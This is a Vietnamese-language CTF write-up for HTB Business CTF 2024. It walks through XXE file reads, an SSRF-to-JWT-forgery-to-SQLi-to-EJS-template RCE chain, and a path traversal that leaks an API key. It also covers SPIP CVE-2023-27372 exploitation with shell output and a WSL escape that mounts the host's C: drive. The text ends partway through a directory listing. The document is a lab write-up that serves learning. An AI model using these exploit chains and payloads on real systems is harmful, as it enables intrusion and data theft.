---
title: "Htb business ctf 2024 the vault of hope - solved challenges in time"
excerpt: "May 18, 2024 08:00 PM ICT to May 22, 2024 08:00 PM ICT"
header:
show_date: true
header:
  teaser: "../assets/images/images-icon/htb-bussiness.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/htb-bussiness.jpg">
</p>

# Solved challenges

## Web/Jailbreak

![image](https://hackmd.io/_uploads/BJoEs2o7C.png)

- Mở đầu các chall web bằng một bài black box khá đơn giản.
- Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware với định dạng file xml.

![image](https://hackmd.io/_uploads/rkd6DniQA.png)

- Nhìn vào thì ta sẽ nghĩ ngay đến vul XXE external entity injection để đọc file trên hệ thống.
- Quan sát kĩ hơn bằng việc chặn proxy :

![image](https://hackmd.io/_uploads/B1gZK2jQA.png)

- Post method với ``/api/update`` nhận file xml và trả ra nội dung update version nằm trong một thẻ của file xml vì vậy có thể đoán nôm na rằng server sẽ hiển thị nội dung của tag `Version`.

- Tiến hành khai thác lỗi mình tạo một entity truy xuất đến ``file:///flag.txt`` trên hệ thống sau đó hiện thị nội dung của nó ở ``&xxe;`` để tra ra output.

![image](https://hackmd.io/_uploads/r1Vr5nom0.png)

- Thành công nhận flag, nếu mà server không xử lí tag nào trong xml thì có thể dùng OOB để trả kết quả ra domain của mình.

Flag : `HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_93b9aa9d1cfdfb143ffab196aca78f35}`


## Web/Blueprint Heist

![image](https://hackmd.io/_uploads/S1j1hhjXC.png)

- Tiếp theo là một bài white-box với source `**nodejs+graphql+ejs template**`

- Bài này chain khá nhiều vul cụ thể ta phải tận dụng 3 lỗi để RCE.

### Reconnaissance + detect
- Đặt bản thân với tư các người dùng thì mình sẽ test qua các chức năng chính của trang web.
- Giao diện chỉ đơn giản như dưới đây:
![image](https://hackmd.io/_uploads/SyrqpnjQC.png)

- Khi click vào 2 mục thì sẽ tải các file pdf từng phần liên quan của các mục về máy mình.
- View nhanh qua các api được gọi:

![image](https://hackmd.io/_uploads/HkcVA2om0.png)

![image](https://hackmd.io/_uploads/rkxc3RhoQC.png)

- Tiêu biểu ở đây nhất là api /download nhận param token và body là url đường dẫn trực tiếp-> nghi nghi ssrf ở đâu đây :/

- Mình sẽ đi luôn vào source code để làm sáng tỏ những api trên.

![image](https://hackmd.io/_uploads/ByC3J6jmC.png)

- Mục tiêu của bài này là đọc file flag nằm tại `/root/flag` -> có 2 cách để tiếp cận, 1 là đọc trực tiếp nó, 2 là run `/readflag` có chức năng đọc file trên.

```
 //index.js
app.set("view engine", "ejs");
app.use('/static', express.static(path.join(__dirname, 'static')));

app.use(internalRoutes)
app.use(publicRoutes)

app.use((res, req, next) => {
  const err = generateError(404, "Not Found")
  return next(err);
});

app.use((err, req, res, next) => {
  renderError(err, req, res);
});

```
- Có thể thấy web có 2 routes chính là `publicRoutes` và `internalRoutes` bên cạnh đó còn 1 middleware `generateError` để validate một vài lỗi trước khi `renderError` ở cuối.

`` Vì ứng dụng viết theo mô hình mvc nên mình sẽ phân thích theo tư duy này luôn``

Đi thẳng vào 2 routes này :

#### publicRoutes

```
const { authMiddleware, generateGuestToken } = require("../controllers/authController")
const { convertPdf } = require("../controllers/downloadController")

router.get("/", (req, res) => {
    res.render("index");
})

router.get("/report/progress", (req, res) => {
    res.render("reports/progress-report")
})

router.get("/report/enviromental-impact", (req, res) => {
    res.render("reports/enviromental-report")
})

router.get("/getToken", (req, res, next) => {
    generateGuestToken(req, res, next)
});

router.post("/download", authMiddleware("guest"), (req, res, next) => {
    convertPdf(req, res, next)
})

```
- Route này lại chứa 5 routes chính và ở đây có 2 routes quan trọng để khai thác:
- `/getToken` endpoint để generate token cho guest và trả ra trực tiếp cho client. Sử dụng method `generateGuestToken` nằm trong `authController` với secret trong `.env`.
```
function generateGuestToken(req, res, next) {
    const payload = {
        role: 'user'
    };
    jwt.sign(payload, secret, (err, token) => {
        if (err) {
            next(generateError(500, "Failed to generate token."));;
        } else {
            res.send(token);
        }
    });
}
```
- `/dowload` endpoint với method post có vẻ đây là api quan trọng mà ta tìm được ở trên thì tương tự nó dùng method `convertPdf` và cần phải có auth với guest được, nó sẽ lấy nội dung từ url của mình và lưu thành filepdf.

```
const { generateError } = require('./errorController');
const { isUrl } = require("../utils/security")
const crypto = require('crypto');
const wkhtmltopdf = require('wkhtmltopdf');

async function convertPdf(req, res, next) {
    try {
        const { url } = req.body;

        if (!isUrl(url)) {
            return next(generateError(400, "Invalid URL"));
        }

        const pdfPath = await generatePdf(url);
        res.sendFile(pdfPath, {root: "."});

    } catch (error) {
        return next(generateError(500, error.message));
    }
}

async function generatePdf(urls) {
    const pdfFilename = generateRandomFilename();
    const pdfPath = `uploads/${pdfFilename}`;

    try {
        await generatePdfFromUrl(urls, pdfPath);
        return pdfPath;
    } catch (error) {
        throw new Error(`Error generating PDF: ${error.stack}`);
    }
}

async function generatePdfFromUrl(url, pdfPath) {
    return new Promise((resolve, reject) => {
        wkhtmltopdf(url, { output: pdfPath }, (err) => {
            if (err) {
                console.log(err)
                reject(err);
            } else {
                resolve();
            }
        });
    });
}

function generateRandomFilename() {
    const randomString = crypto.randomBytes(16).toString('hex');
    return `${randomString}.pdf`;
}

module.exports = { convertPdf };
```

#### internalRoutes
```
const { authMiddleware } = require("../controllers/authController")

const schema = require("../schemas/schema");
const pool = require("../utils/database")
const { createHandler } = require("graphql-http/lib/use/express");


router.get("/admin", authMiddleware("admin"), (req, res) => {
    res.render("admin")
})

router.all("/graphql", authMiddleware("admin"), (req, res, next) => {
    createHandler({ schema, context: { pool } })(req, res, next); 
});
```

- Routes này chứa 2 routes -> điểm mình sẽ tận dụng là `/grapql` nhưng routes này cần có auth admin và chấp nhận tất cả các method http.

```
const { GraphQLObjectType, GraphQLSchema, GraphQLString, GraphQLList } = require('graphql');
const UserType = require("../models/users")
const { detectSqli } = require("../utils/security")
const { generateError } = require('../controllers/errorController');

const RootQueryType = new GraphQLObjectType({
  name: 'Query',
  fields: {
    getAllData: {
      type: new GraphQLList(UserType),
      resolve: async(parent, args, { pool }) => {
        let data;
        const connection = await pool.getConnection();
        try {
            data = await connection.query("SELECT * FROM users").then(rows => rows[0]);
        } catch (error) {
            generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    },
    getDataByName: {
      type: new GraphQLList(UserType),
      args: {
        name: { type: GraphQLString }
      },
      resolve: async(parent, args, { pool }) => {
        let data;
        const connection = await pool.getConnection();
        console.log(args.name)
        if (detectSqli(args.name)) {
          return generateError(400, "Username must only contain letters, numbers, and spaces.")
        }
        try {
            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows => rows[0]);
        } catch (error) {
            return generateError(500, error)
        } finally {
            connection.release()
        }
        return data;
      }
    }
  }
});

const schema = new GraphQLSchema({
  query: RootQueryType
});

module.exports = schema;

```

- Quan sát src trên ta có thể thấy có khả năng bị sqli ở trên khi truyền vào `args->query` nhưng có 1 waf:

```
function detectSqli (query) {
    const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]/
    return pattern.test(query)
}
```

- Vấn đề ở đây là bypass waf để SQLi.

#### RCE

- Cùng để ý thì ở `index.js` có một routes xử lí ngoại lệ(error).
- Middleware sẽ check error và hiển thị với template ejs:

````
function generateError(status, message) {
    const err = new Error(message);
    err.status = status;
    return err;
};

const renderError = (err, req, res) => {
    res.status(err.status);
    const templateDir = __dirname + '/../views/errors';
    const errorTemplate = (err.status >= 400 && err.status < 600) ? err.status : "error"
    let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);

    if (!fs.existsSync(templatePath)) {
        templatePath = path.join(templateDir, `error.ejs`);
    }
    console.log(templatePath)
    res.render(templatePath, { error: err.message }, (renderErr, html) => {
        res.send(html);
    });
};

module.exports = { generateError, renderError }
````

Chú ý `const errorTemplate = (err.status >= 400 && err.status < 600) ? err.status : "error"` check status để chọn tên trang hiển thị lỗi.

![image](https://hackmd.io/_uploads/SkWrKTsQ0.png)

![image](https://hackmd.io/_uploads/HkvLK6s7R.png)

![image](https://hackmd.io/_uploads/S1PDYajmC.png)

![image](https://hackmd.io/_uploads/Hy0vKpjXR.png)

-> Do đó ta sẽ ghi vào 1 file `ejs` để đọc flag hiển thị khi error vì page sẽ render theo tên status trước.

### Exploit wkhtmltopdf SSRF

  `"wkhtmltopdf": "^0.4.0"`

Searching thì khác nhanh tìm được vul và poc:

![image](https://hackmd.io/_uploads/BkE99pj7C.png)

- Khá giống với DNS binding thì mình sẽ redirect đến `file://` tùy chỉnh trên hệ thống để `wkhtmltopdf` convert file đó sang dạng pdf và truy xuất nội dung.
- Tạo server attack + public host with ngrok:

![image](https://hackmd.io/_uploads/BJNTspoQC.png)

- Thành công lấy được nội dung `/etc/passwd`

![image](https://hackmd.io/_uploads/r1DenpimR.png)

![image](https://hackmd.io/_uploads/BJZBnpiQC.png)

### Leak secret_key jwt -> authenticate to admin user.

- Để truy cập được `/graphql` endpoint thì cần role của mình là `admin` cho nên ta phải control được jwt.
- Chia sẻ 1 chút là ban đầu mình đọc:

![image](https://hackmd.io/_uploads/HJAX0Tjm0.png)

- Thấy secret nên mình nghĩ có thể leak được với weak secret nhưng mà không được mà quên mất là leak được .env với ssrf ở trên :> ( phản xạ quá chậm:(( )
- Ok thì tương tự mình leak được `/app/.env`

![image](https://hackmd.io/_uploads/ryxm1AiQC.png)

``secret=Str0ng_K3y_N0_l3ak_pl3ase?``

- Giả mạo token admin với secret_key ở trên:
![image](https://hackmd.io/_uploads/SkhtOH370.png)

![image](https://hackmd.io/_uploads/rkRnOShXC.png)
- Cũng có thể dùng 1 số tool để tạo
![image](https://hackmd.io/_uploads/rkjGivn70.png)

- Dùng token này để access đến endpoint `/graphql` nhưng lưu ý là server check `localhost`

```
function checkInternal(req) {
    const address = req.socket.remoteAddress.replace(/^.*:/, '')
    return address === "127.0.0.1"
}
```

- Do đó ta sẽ phải access thông qua bug ssrf ở trên.

![image](https://hackmd.io/_uploads/SJEG3wh7R.png)

### Exploit Sqli bypass waf

- Chức năng dành cho `internal user` để truy xuất ra cơ sở dữ liệu với param `query`.
- Regex check `^.*[!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]`.
- Nhìn đến này thì ta nhớ đến bài ssti với ruby(ERB) trong HTB cũng có loại này và ta sẽ bypass với `\n` vì tất cả những kí tự ở dòng mới sẽ không bị `test`.

![image](https://hackmd.io/_uploads/HyIqIpjXR.png)

![image](https://hackmd.io/_uploads/BkFUwps70.png)

![image](https://hackmd.io/_uploads/ryzYxt3QC.png)

![image](https://hackmd.io/_uploads/SynYethXC.png)

- Thử dùng hàm `loadfile` trong mysql thì thành công leak được các file hệ thống nhưng có vẻ không có quyền root với user db.

![image](https://hackmd.io/_uploads/SyI6XKnQ0.png)

![image](https://hackmd.io/_uploads/rJn07FnQA.png)

![image](https://hackmd.io/_uploads/S1c6QF37R.png)

-> Hook ở đây với bug tiếp theo là mình sẽ lợi dùng hàm `writefile` để ghi vào template ejs để exploit SSTI.

### SSTI in ejs template via sqli

- Nếu chỉ có bug SQLi thì khá khó để RCE được vì chắc chắn sẽ có hạn chế về quyền trên hệ thống nên mình sẽ khai thác thông qua chức năng hiển thị errorPage của trang web.

![image](https://hackmd.io/_uploads/H1LNtYhXA.png)

![image](https://hackmd.io/_uploads/HyvBYt3mC.png)

- Sau vài lần tạo thì mình đã tạo mới file `404.ejs` và ghi nội dung từ hook sqli ở trên

![image](https://hackmd.io/_uploads/Bk5cKYn70.png)

Payload: `<%=7*7%>`
![image](https://hackmd.io/_uploads/ryJ7l9hmR.png)

![image](https://hackmd.io/_uploads/ryAslcnmA.png)

![image](https://hackmd.io/_uploads/B10Byq3QR.png)

- Truy cập vào một endpoint không tồn tại để kích hoạt middleware hiển thị 404 `Not Found` và lúc này sẽ render tên file `404.ejs` mà mình mới tạo và ghi vào.

![image](https://hackmd.io/_uploads/HJl6k52X0.png)

![image](https://hackmd.io/_uploads/S1rK0-6XR.png)

![image](https://hackmd.io/_uploads/rJu9RWa7R.png)

![image](https://hackmd.io/_uploads/SJ3sCZTmR.png)

![image](https://hackmd.io/_uploads/rySb1MTQA.png)

- Ngoài ra, còn 1 mẹo khá hay là bạn có thể nối chuỗi nó kiểu như này select 'l','a','m' into outfile thì ta nhận được chuỗi liền kề `abc`.

### Exploit chain

- Nói khá dài ở trên nên mình xin phép tóm lược lại flow của bài này.

1. Lợi dụng bug ssrf để đọc file `/app/.env` để lấy secret -> tạo token với role `admin`

2. Khai thác sqli ở `/graphql` để ghi vào một file `404.ejs` `notFound` nhằm lợi dụng việc render template error của server.
3. Ghi vào file mới trong `/app/views/errors/404.ejs` với syntax ejs và RCE thành công.

![image](https://hackmd.io/_uploads/HJ71zfamA.png)
![image](https://hackmd.io/_uploads/SktxzMam0.png)

`secret=Str0ng_K3y_N0_l3ak_pl3ase?`

![image](https://hackmd.io/_uploads/S1MBMzpQC.png)

![image](https://hackmd.io/_uploads/H1QuMGTm0.png)

![image](https://hackmd.io/_uploads/B1uiMM6XA.png)

![image](https://hackmd.io/_uploads/BJ4AGGamC.png)

![image](https://hackmd.io/_uploads/Sy_eQMTm0.png)

Flag: `HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_fb9b1487d1761dfa224ee888e57fcefd}`

![image](https://hackmd.io/_uploads/SyRO4GpmA.png)


Chắc sẽ có thắc mắc sao không được file /root/flag.txt luôn từ ssrf nhưng mà mình đã test thử không được có vẻ như là userdb không có quyền truy cập vào /root thay vào đó thì user web lại có quyền này:

![image](https://hackmd.io/_uploads/HJqfXU3XR.png)


# Giải này phần MISC có khá nhiều bài web với mức độ tầm medium + easy

## MISC/Chrono Mind

![image](https://hackmd.io/_uploads/HJsTbCoQA.png)

- Một bài white-box với source python khá mới với mô hình hoạt động khá giống với nhiều con AI hiện nay như chat-gpt, gemini,...
- Đầu tiên mình nghĩ do đây là misc nên chắc sẽ dạng LLM (promt injection mới nổi dạo gần đây :/) nhưng mà không anh `Ngọc` nói nó chỉ là path travesal thôi :\ .
- Đúng như vậy thật vì mình không thấy web call api nào khác.

````
// main.py
from fastapi import FastAPI, Request
from fastapi.staticfiles import StaticFiles
from routes.api import router as api_router
from fastapi.responses import FileResponse, JSONResponse, RedirectResponse
from config import Config

app = FastAPI(title="main app", docs_url=None, redoc_url=None)
api = FastAPI(title="api app", docs_url=None, redoc_url=None)

api.include_router(api_router)

app.mount("/api", api)

@app.get('/chat/{room}')
def chat(room: str):
    if not room or room != Config.roomID:
        return RedirectResponse('/', status_code=302)

    return FileResponse('public/chat.html', media_type='html')

app.mount("/", StaticFiles(directory="public", html=True), name="public")


@app.exception_handler(Exception)
async def universal_exception_handler(request: Request, exc: Exception):
    return JSONResponse(
        status_code=500,
        content={"message": "An unexpected error occurred."}
    )

```

- Trang web có một chức năng chính là chat -> đầu tiên sẽ có menu 3 room chat-> mỗi room chat sẽ giúp `languagemodels` đọc dữ liệu từ từng file md khác nhau mà khuôn mẫu sẽ trả lời các câu trong file đó.

```
// api.py
import languagemodels as lm
from fastapi import APIRouter, Cookie, Response
from pydantic import BaseModel
from uuid import uuid4
from utils import getRepository, evalCode
from config import Config

lm.config['instruct_model'] = 'LaMini-Flan-T5-248M'
lm.config['max_tokens'] = 400

router = APIRouter()

class createParams(BaseModel):
    topic: str

class chatParams(BaseModel):
    prompt: str

class copilotParams(BaseModel):
    code: str
    copilot_key: str

@router.post("/create")
async def createRoom(response: Response, params: createParams):
    # rate limit room creation
    if Config.createProgress == False:
        Config.createProgress = True
    else:
        return {"message": "A room creation is already in progress"}

    # get knowledge repository
    content = getRepository(params.topic)

    if not content:
        Config.createProgress = False
        return {"message": "Failed to fetch this repository, please try again"}


    # clear previous context
    lm.docs.clear()

    # store the doc
    lm.store_doc(content)

    # save params
    Config.roomID = str(uuid4())

    # create session
    response.status_code = 201
    response.set_cookie("room", Config.roomID)

    # room progress is done
    Config.createProgress = False
    return {"room": Config.roomID, "topic": params.topic}

@router.post("/ask")
def ask_gpt(response: Response, chatParams: chatParams, room: str = Cookie(None)):
    if Config.roomID != room:
        response.status_code = 404
        return {"message": "Room does not exist"}

    # get the response
    context = lm.get_doc_context(chatParams.prompt)
    context = context.split("\n")
    context = context[0]

    answer = lm.extract_answer(chatParams.prompt, context)

    # return the response
    return {"answer": answer}

@router.post("/copilot/complete_and_run")
def copilot_complete_and_run(response: Response, params: copilotParams):
    if Config.copilot_key != params.copilot_key:
        response.status_code = 403
        return {"message": "Invalid API key"}

    # get code completion
    completion = lm.code(params.code)

    if not completion.strip():
        return {"message": "Failed to get code completion"}

    full_code = params.code + completion.strip()

    # return the response
    return {"completion": full_code, "result": evalCode(full_code)}
````

- Có 3 routes chính trong route `/api` là /create ->tạo phòng chat; `/ask->chat` -> chat với bot; `/copilot/complete_and_run` -> thực hiện evalCode là tạo 1 file .py với nội dung `code` sau đó chạy nó và nhận đầu ra -> xóa file .py

````
def evalCode(code):
    output = ""
    random = uuid.uuid4().hex
    filename = os.path.join("uploads/") + random + ".py"
    try:
        with open(filename, "w") as f:
            f.write(code)

        output = subprocess.run(
            ["python3", filename],
            timeout=10,
            capture_output=True,
            text=True,
        ).stdout.strip("\n")

        cleanup(filename)

        return output

    except Exception as e: # handle any exception
        print(e, flush=True)
        cleanup(filename)
        return False
````
- Vậy thì đây chắc chắn sẽ là endpoint mà ta hướng tới.
- Nhưng trong này lại check compilot_key nằm trong `Config`

````
//config.py
import os

class Config():
    roomID = None
    createProgress = False
    chatProgress = False
    knowledgePath = f"{os.getcwd()}/repository"
    copilot_key = "REDACTED_SECRET"
````
- Và key này được random nên khó brute-force được :
![image](https://hackmd.io/_uploads/B1nDSCiQ0.png)
- Đó là tổng quan chức năng, tiếp theo là vul của web nằm ở việc `/create` new room

````
@router.post("/create")
async def createRoom(response: Response, params: createParams):
    # rate limit room creation
    if Config.createProgress == False:
        Config.createProgress = True
    else:
        return {"message": "A room creation is already in progress"}

    # get knowledge repository
    content = getRepository(params.topic)

    if not content:
        Config.createProgress = False
        return {"message": "Failed to fetch this repository, please try again"}


    # clear previous context
    lm.docs.clear()

    # store the doc
    lm.store_doc(content)

    # save params
    Config.roomID = str(uuid4())

    # create session
    response.status_code = 201
    response.set_cookie("room", Config.roomID)

    # room progress is done
    Config.createProgress = False
    return {"room": Config.roomID, "topic": params.topic}
    
    /////////////
    
    def readFile(path):
    try:
        with open(path, 'r') as f:
            return f.read()
    except:
        return None

def getRepository(topic):
    for suffix in ['', '.md']:
        repoFile = f"{Config.knowledgePath}/{topic}{suffix}"
        print(repoFile)
        if os.path.exists(repoFile):
            return readFile(repoFile)
    return None
````

- Có thể thấy phương thức `getRepository` dính bug `path traversal` vì dòng ``for suffix in ['', '.md']:
        repoFile = f"{Config.knowledgePath}/{topic}{suffix}"`` nên hiển nhiên ta có thể join vào file ``../config.py`` để `languagemodels` đọc compilot_key

![image](https://hackmd.io/_uploads/ByAXfqFQ0.png)
![image](https://hackmd.io/_uploads/Byb_K5KXC.png)

Flag: `HTB{1nj3c73d_c0n73x7_c0p1l07_3x3cu73_3b0681e37e0b5b219d0c3abd78d04446}`

## FullPwn/Submerged

- Đây là một bài khá khó vì mình mới vừa tìm hiểu làm dạng researching black-box này.

- Scan các cổng ta thấy có cổng 80(http) đang mở và redirect về domain `submerged.htb`. 
- Vào trang web không có gì nổi bật cũng không hề call api và để ý có 1 mục nói về tất cả những nội dung đã được chuyển về `spip.submerged.htb`.
- Tiếp tục scan dir thì mình thấy có nhiều file có thể truy cập như htaccess.txt vào trong thì mình thấy trang web đang dùng spip template và nó dính `CVE-2023-27372` RCE được luôn mà, POC khá nhiều trên github clone về chạy thì RCE được.

- Chall có 2 flag là user flag thì chỉ cần `cat /home/matthew/user.txt` là được user flag thì đoạn này dễ nên mình cũng không chụp lại.

### User Flag

user flag : `HTB{SpIP_Abu53_4_RC3}`

### Root flag

- Mình chưa học nhiều về leo thang đặc quyền nên khá kém, mãi sau 1 buổi được 1 anh list cho là sudo -l thì matthew có thể access với quyền root mà không cần nhập mật khẩu, mình cứ nghĩ vào /root/root.txt là có root flag nhưng không, mình ngồi mất 3 tiếng để lục tung tất cả các file trong server cả /tmp/cache/,var/etc/,vv.. nhưng vẫn không có.
- Cuối cùng tìm được manh mối:

````
$ sudo uname -a

Linux WIN-1EGDT8E0CN3 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux
````

- Thì con linux chạy server này chẳng qua chỉ là wsl của window thôi , root thực chất ở đây là Administrator của window.

- Bây giờ tìm xem làm sao để access ra ngoài wsl thì mình tìm được cách để mount ổ ``C:/`` ở window sang `/mnt` trên wsl.

Tạo một thư mục tạm để mount:
sudo mkdir /mnt/temp
Mount C: vào dir tmp:
sudo mount -t drvfs C: /mnt/temp
- Lúc này trong /mnt/tmp/ sẽ access được như dưới đây:

````
┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/HTBBusi/CVE-2023-27372/CVE-2023-27372-PoC]
└─$ sudo python3 exploit.py -u http://spip.submerged.htb
[+] The Target http://spip.submerged.htb is vulnerable
[!] Spawning interactive shell
[!] Shell spawned successfully. Ensure to re-type commands in the event they do not provide output.
$  sudo ls -la /mnt/temp/Users/Administrator/

total 1584
drwxrwxrwx 1 root root    512 Apr 10 11:55 .
drwxrwxrwx 1 root root    512 Apr 30 09:31 ..
drwxrwxrwx 1 root root    512 Nov 29  2022 3D Objects
drwxrwxrwx 1 root root    512 Apr 29  2020 AppData
lrwxrwxrwx 1 root root     45 Apr 29  2020 Application Data
drwxrwxrwx 1 root root    512 Nov 29  2022 Contacts
lrwxrwxrwx 1 root root     73 Apr 29  2020 Cookies
drwxrwxrwx 1 root root    512 Apr 27 11:38 Desktop
drwxrwxrwx 1 root root    512 Nov 29  2022 Documents
drwxrwxrwx 1 root root    512 Nov 29  2022 Downloads
drwxrwxrwx 1 root root    512 Nov 29  2022 Favorites
drwxrwxrwx 1 root root    512 Nov 29  2022 Links
lrwxrwxrwx 1 root root     43 Apr 29  2020 Local Settings
drwxrwxrwx 1 root root    512 Nov 29  2022 Music
lrwxrwxrwx 1 root root     39 Apr 29  2020 My Documents
-rwxrwxrwx 1 root root 262144 Apr 30 14:08 NTUSER.DAT
-rwxrwxrwx 1 root root  65536 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TM.blf
-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000002.regtrans-ms
lrwxrwxrwx 1 root root     81 Apr 29  2020 NetHood
drwxrwxrwx 1 root root    512 Nov 29  2022 Pictures
lrwxrwxrwx 1 root root     70 Apr 29  2020 Recent
drwxrwxrwx 1 root root    512 Nov 29  2022 Saved Games
drwxrwxrwx 1 root root    512 Nov 29  2022 Searches
lrwxrwxrwx 1 root root     70 Apr 29  2020 SendTo
lrwxrwxrwx 1 root root     74 Apr 29  2020 Start Menu
lrwxrwxrwx 1 root root     73 Apr 29  2020 Templates
drwxrwxrwx 1 root root    512 Nov 29  2022 Videos
-rwxrwxrwx 1 root root 143360 Apr 29  2020 ntuser.dat.LOG1
-rwxrwxrwx 1 root root  99328 Apr 29  2020 ntuser.dat.LOG2
-rwxrwxrwx 1 root root     20 Apr 29  2020 ntuser.ini
drwxrwxrwx 1 root root    512 Apr 30 09:40 tasks

$ sudo cat /mnt/temp/Users/Administrator/NTUSER.DAT

$  sudo cat /mnt/temp/Users/Administrator/ntuser.ini
��

$  sudo ls -la /mnt/temp/Users/Administrator/Cookies/

$  sudo ls -la /mnt/temp/Users/Administrator/Documents/

total 0
drwxrwxrwx 1 root root 512 Nov 29  2022 .
drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
lrwxrwxrwx 1 root root  35 Apr 29  2020 My Music
lrwxrwxrwx 1 root root  38 Apr 29  2020 My Pictures
lrwxrwxrwx 1 root root  36 Apr 29  2020 My Videos
-rwxrwxrwx 1 root root 402 Nov 29  2022 desktop.ini

$ sudo cat /mnt/temp/Users/Administrator/Documents/desktop.ini
��
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21770
IconResource=%SystemRoot%\system32\imageres.dll,-112
IconFile=%SystemRoot%\system32\shell32.dll
IconIndex=-235

$  sudo ls -la /mnt/temp/Users/Administrator/Documents/My Music/

$ sudo ls -la /mnt/temp/Users/Administrator/Documents/My Pictures

$ sudo ls -la /mnt/temp/Users/Administrator/Documents/My Videos/

$ sudo ls -la /mnt/temp/Users/Administrator/

total 1584
drwxrwxrwx 1 root root    512 Apr 10 11:55 .
drwxrwxrwx 1 root root    512 Apr 30 09:31 ..
drwxrwxrwx 1 root root    512 Nov 29  2022 3D Objects
drwxrwxrwx 1 root root    512 Apr 29  2020 AppData
lrwxrwxrwx 1 root root     45 Apr 29  2020 Application Data
drwxrwxrwx 1 root root    512 Nov 29  2022 Contacts
lrwxrwxrwx 1 root root     73 Apr 29  2020 Cookies
drwxrwxrwx 1 root root    512 Apr 27 11:38 Desktop
drwxrwxrwx 1 root root    512 Nov 29  2022 Documents
drwxrwxrwx 1 root root    512 Nov 29  2022 Downloads
drwxrwxrwx 1 root root    512 Nov 29  2022 Favorites
drwxrwxrwx 1 root root    512 Nov 29  2022 Links
lrwxrwxrwx 1 root root     43 Apr 29  2020 Local Settings
drwxrwxrwx 1 root root    512 Nov 29  2022 Music
lrwxrwxrwx 1 root root     39 Apr 29  2020 My Documents
-rwxrwxrwx 1 root root 262144 Apr 30 14:08 NTUSER.DAT
-rwxrwxrwx 1 root root  65536 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TM.blf
-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000001.regtrans-ms
-rwxrwxrwx 1 root root 524288 Apr 29  2020 NTUSER.DAT{fcb0247b-8a45-11ea-8129-ff069143d34c}.TMContainer00000000000000000002.regtrans-ms
lrwxrwxrwx 1 root root     81 Apr 29  2020 NetHood
drwxrwxrwx 1 root root    512 Nov 29  2022 Pictures
lrwxrwxrwx 1 root root     70 Apr 29  2020 Recent
drwxrwxrwx 1 root root    512 Nov 29  2022 Saved Games
drwxrwxrwx 1 root root    512 Nov 29  2022 Searches
lrwxrwxrwx 1 root root     70 Apr 29  2020 SendTo
lrwxrwxrwx 1 root root     74 Apr 29  2020 Start Menu
lrwxrwxrwx 1 root root     73 Apr 29  2020 Templates
drwxrwxrwx 1 root root    512 Nov 29  2022 Videos
-rwxrwxrwx 1 root root 143360 Apr 29  2020 ntuser.dat.LOG1
-rwxrwxrwx 1 root root  99328 Apr 29  2020 ntuser.dat.LOG2
-rwxrwxrwx 1 root root     20 Apr 29  2020 ntuser.ini
drwxrwxrwx 1 root root    512 Apr 30 09:40 tasks

$ sudo ls -la /mnt/temp/Users/Administrator/Recent/

$ sudo ls -la /mnt/temp/Users/Administrator/AppData/

total 0
drwxrwxrwx 1 root root 512 Apr 29  2020 .
drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
drwxrwxrwx 1 root root 512 Apr 29  2020 Local
drwxrwxrwx 1 root root 512 Apr 29  2020 LocalLow
drwxrwxrwx 1 root root 512 Sep 15  2018 Roaming

$  sudo ls -la /mnt/temp/Users/Administrator/AppData/Local/

total 0
drwxrwxrwx 1 root root 512 Apr 29  2020 .
drwxrwxrwx 1 root root 512 Apr 29  2020 ..
lrwxrwxrwx 1 root root  43 Apr 29  2020 Application Data
lrwxrwxrwx 1 root root  69 Apr 29  2020 History
drwxrwxrwx 1 root root 512 Sep 15  2018 Microsoft
drwxrwxrwx 1 root root 512 Apr 29  2020 PeerDistRepub
drwxrwxrwx 1 root root 512 Apr 30 13:48 Temp
lrwxrwxrwx 1 root root  71 Apr 29  2020 Temporary Internet Files

$  sudo ls -la /mnt/temp/Users/Administrator/AppData/Application Data/

$  sudo ls -la /mnt/temp/Users/Administrator/AppData/History/

$  sudo ls -la /mnt/temp/Users/Administrator/Favorites/

total 0
drwxrwxrwx 1 root root 512 Nov 29  2022 .
drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
-rwxrwxrwx 1 root root 402 Nov 29  2022 desktop.ini

$  sudo ls -la /mnt/temp/Users/Administrator/Videos/

total 0
drwxrwxrwx 1 root root 512 Nov 29  2022 .
drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
-rwxrwxrwx 1 root root 504 Nov 29  2022 desktop.ini

$  sudo ls -la /mnt/temp/Users/Administrator/tasks/

total 0
drwxrwxrwx 1 root root 512 Apr 30 09:40 .
drwxrwxrwx 1 root root 512 Apr 10 11:55 ..
-rwxrwxrwx 1 root root  76 Apr 30 11:03 copy_flag.bat
-rwxrwxrwx 1 root root  74 Apr 26 12:39 startup.bat

$ sudo cat /mnt/temp/Users/Administrator/tasks/copy_flag.bat

type c:\users\matthew\desktop\user.txt | wsl /bin/bash -c "cat > ~/user.txt"

$ cat /home/matthew/user.txt

HTB{SpIP_Abu53_4_RC3}
$ sudo ls -la /mnt/temp/Users/Administrator/tasks/
total 0
drwxrwxrwx 1 root root 512 Apr 30 09:40 .
